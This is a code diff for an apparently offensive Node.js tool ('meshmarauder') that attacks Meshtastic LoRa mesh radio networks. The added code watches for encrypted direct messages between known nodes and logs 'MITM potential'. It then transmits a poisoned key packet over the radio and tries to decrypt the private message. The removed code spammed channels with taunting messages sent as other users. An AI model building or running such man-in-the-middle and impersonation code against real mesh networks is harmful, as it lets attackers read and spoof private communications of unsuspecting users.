@@ -15,9 +15,26 @@ let macaddrs = {
 }
 
 
+function htonl(n){
+
+  let inView = new DataView (new Uint8Array(4).buffer)
+  let outView = new DataView (new Uint8Array(4).buffer)
+
+  inView.setUint32(0, n)
+
+  outView.setUint8(0, inView.getUint8(3))
+  outView.setUint8(1, inView.getUint8(2))
+  outView.setUint8(2, inView.getUint8(1))
+  outView.setUint8(3, inView.getUint8(0))
+
+  return outView.getUint32(0)
+}
+
+
 let counts = {
   lines: 0,
   packets: 0,
+  dms: 0,
   users: 0,
   evils: 0,
   sent: 0
@@ -31,21 +48,6 @@ let port = null
 let ingestComplete = false
 
 let config = null
-
-let MESSAGES = [
-  "🥷📢 hello, we've been trying to contact you about your mesh's extended warranty",
-  "🥷📢 https://youtu.be/dQw4w9WgXcQ",
-  "🥷📢 all ur mesh are belong to us",
-  "🥷📢 nothing is signed",
-  "🥷📢 do not use this medium for sensitive communications"
-]
-
-function randomString(){
-
-  let idx = Math.round((MESSAGES.length -1) * Math.random())
-
-  return MESSAGES[idx] 
-}
 
 async function handleLine(line){
   counts.lines++
@@ -64,7 +66,36 @@ async function handleLine(line){
 
         let pkt = new LorapipeRawPacket(seen, rssi, snr, raw, CHANNELS)
 
+        if(ingestComplete){
+          console.log(pkt)
+        }
+
         counts.packets++
+
+        if(ingestComplete && pkt.parsed && pkt.parsed.is_dm && pkt.parsed.decoded == false && pkt.parsed.decrypted == false){
+
+          let fromStr = htonl(pkt.header.from).toString(16)
+          let toStr = htonl(pkt.header.to).toString(16)
+
+          console.log(pkt.meta.seen, '📨 dm from', fromStr, '>', toStr)
+
+          let toUser = macaddrs['!'+toStr]
+          let fromUser = macaddrs['!'+fromStr]
+          if(toUser && fromUser){
+            console.log('MITM potential')
+            console.log('to', toUser)
+            console.log('from', fromUser)
+
+            let buf = await toUser.genPoison()
+            port.write('txraw ' + buf2hex(buf) + '\r\n')
+
+            await toUser.decryptDM(pkt, fromUser)
+          }
+
+          counts.dms++
+
+          //console.log()
+        }
 
         //! is it a user interaction
         if(pkt.parsed && pkt.parsed.content){
@@ -73,21 +104,9 @@ async function handleLine(line){
 
           counts.users++
 
-          let idx = Math.round( (Object.keys(OUTBOUND_CHANNELS).length-1) * Math.random() )
-          let outboundKey = Object.keys(OUTBOUND_CHANNELS)[idx]
+          macaddrs[ pkt.parsed.content.id ] = pkt
 
-          let evil = await pkt.channelChat(outboundKey, randomString())
-          
-          if(evil){
-
-            if(ingestComplete){ 
-              process.stdout.write('🥷')
-            }
-
-            macaddrs[ pkt.parsed.content.id ] = evil
-            counts.evils++
-
-          }
+          console.log('👤', 'id ',pkt.parsed.content.id, htonl(pkt.header.from).toString(16))
 
         } else {
           if(pkt.parsed && pkt.parsed.content && pkt.parsed.content['$typeName'] == 'meshtastic.Position'){
@@ -177,7 +196,7 @@ async function goMaraude(){
 
     //process.stdout.write('txraw ' + buf2hex(buf) + '\n')
 
-    port.write('txraw ' + buf2hex(buf) + '\r\n')
+    //port.write('txraw ' + buf2hex(buf) + '\r\n')
     
     let p = new Promise((resolve, reject)=>{
 
@@ -262,7 +281,23 @@ async function importChannelKeys(config, type, keys=[]){
   
 }
 
-async function handleFlags(){
+async function handleFlags(config){
+  await config.start()
+
+  if(await config.read('h') || await config.read('help')){
+    await showHelp()
+    process.exit()
+  }
+  
+  
+  await importChannelKeys(config, 'decode', fixStringArray(await config.read('c')))
+  await importChannelKeys(config, 'encode', fixStringArray(await config.read('C')))
+
+  
+}
+
+
+async function main() {
 
   config = new Config.NconfConfig({
     basePath: process.env.HOME + '/.meshmarauder',
@@ -282,40 +317,15 @@ async function handleFlags(){
     }
   })
 
-  
-  await config.start()
+  await handleFlags(config)
 
-  if(await config.read('h') || await config.read('help')){
-    await showHelp()
-    process.exit()
-  }
-  
-  
-  await importChannelKeys(config, 'decode', fixStringArray(await config.read('c')))
-  await importChannelKeys(config, 'encode', fixStringArray(await config.read('C')))
-  
-  let c = await config.readAll()
-
-  
-  console.log(c)
-  //process.exit()
-  
-}
-
-
-async function main() {
-
-  await handleFlags()
-
-  let files = await config.read('f')
+  let files = fixStringArray(await config.read('f'))
   let device = await config.read('D')
   
   port = new SerialPort({ path: device , baudRate: 115200 })
  
  
-  if(typeof files == 'string'){
-
-  } else if(Array.isArray(files)){
+  if(Array.isArray(files) && files.length > 0){
 
     let filePromise = []
 
